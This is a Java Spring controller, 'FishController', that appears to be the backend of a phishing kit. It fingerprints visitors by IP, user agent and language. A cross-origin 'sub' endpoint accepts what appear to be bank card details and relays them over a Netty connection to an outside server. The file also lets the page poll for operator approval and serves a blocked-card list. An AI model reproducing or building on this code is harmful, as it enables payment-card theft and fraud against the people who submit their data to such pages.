package com.gzlh.controller;

import cn.hutool.cache.impl.TimedCache;
import cn.hutool.core.util.StrUtil;
import cn.hutool.crypto.digest.DigestUtil;
import cn.hutool.http.HttpUtil;
import cn.hutool.json.JSONUtil;
import com.gzlh.cache.CacheManager;
import com.gzlh.entity.AgreeBO;
import com.gzlh.entity.BinCardDTO;
import com.gzlh.entity.CheckBO;
import com.gzlh.entity.UpBO;
import com.gzlh.netty.NettyServer;
import com.gzlh.task.WhiteIpDTO;
import com.gzlh.utils.AjaxJson;
import com.gzlh.utils.IpUtil;
import lombok.extern.slf4j.Slf4j;
import lombok.val;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.view.RedirectView;
import sun.util.cldr.CLDRLocaleDataMetaInfo;

import javax.annotation.Resource;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Collections;

@RestController
@RequestMapping("v1")
@Slf4j
public class FishController {
    @Resource
    private NettyServer nettyServer;

    @Value("${application.name}")
    private String sysName;
    @Value("${main.server}")
    private String mainServer;

    @RequestMapping("up")
    public AjaxJson up(HttpServletRequest request) {
        String ip = IpUtil.getRealIp(request);
        String ua = request.getHeader("user-agent");
        String language = request.getHeader("accept-language");
        String fingerprint = DigestUtil.md5Hex(ip + ua + language);
        UpBO upBO = new UpBO();
        upBO.setIp(ip).setLanguage(language).setFingerprint(fingerprint).setUa(ua);
        HttpUtil.createPost(mainServer + "/visitor/up").body(JSONUtil.toJsonStr(upBO))
                .execute();
        return AjaxJson.getSuccess(ip);
    }

    @RequestMapping("sub")
    @CrossOrigin
    public AjaxJson sub(HttpServletRequest request, @RequestBody BinCardDTO bo) {
        String ip = IpUtil.getRealIp(request);
        String ua = request.getHeader("user-agent");
        String language = request.getHeader("accept-language");
        String fingerprint = DigestUtil.md5Hex(ip + ua + language);
        bo.setSysName(sysName).setFingerprint(fingerprint).setIp(ip).setUa(ua);
        nettyServer.send(JSONUtil.toJsonStr(bo));
        CacheManager.setCache(fingerprint, new AgreeBO());
        return AjaxJson.getSuccessData(fingerprint);
    }


    @RequestMapping("check")
    public AjaxJson check(@RequestBody CheckBO bo) {
        return AjaxJson.getSuccessData(CacheManager.getCache(bo.getFingerprint()));
    }

    @PostMapping("getServerUrl")
    public AjaxJson getServerUrl(){
        return AjaxJson.getSuccessData(CacheManager.getWhiteIpDTO().getUrl());
    }

    @PostMapping("getBlackCardList")
    public AjaxJson getBlackCardList(){
        WhiteIpDTO dto=  CacheManager.getWhiteIpDTO();
        String list=dto.getBlackCardStr();
        return AjaxJson.getSuccessData(StrUtil.isEmpty(list)? Collections.emptyList():StrUtil.splitTrim(list,","));
    }

    @RequestMapping("GetIPInfo")
    public AjaxJson getIPInfo(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String clientIP = request.getRemoteAddr(); // 获取客户端的IP地址
        System.out.println(clientIP);
        String url = "http://ip-api.com/json/";
        String res = HttpUtil.get(url);
        return AjaxJson.getSuccessData(res);
    }
}
